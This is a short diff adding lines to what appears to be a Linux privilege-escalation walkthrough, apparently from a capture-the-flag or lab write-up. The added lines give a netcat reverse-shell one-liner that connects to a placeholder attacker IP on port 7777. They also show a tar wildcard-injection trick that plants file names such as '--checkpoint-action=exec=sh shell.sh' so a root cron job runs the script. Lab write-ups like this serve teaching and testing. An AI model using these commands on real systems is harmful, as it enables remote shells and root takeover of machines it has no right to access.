@@ -496,3 +496,11 @@ After `cron` has run and has created the shell SUID copy of bash, execute it wit
     $ /tmp/shell -p
     # whoami
     root
+
+Or create a shell with the infamous one-liner, and set up a listener on port 7777:
+
+```text
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address attck machine> 7777 >/tmp/f" > shell.sh
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
+```
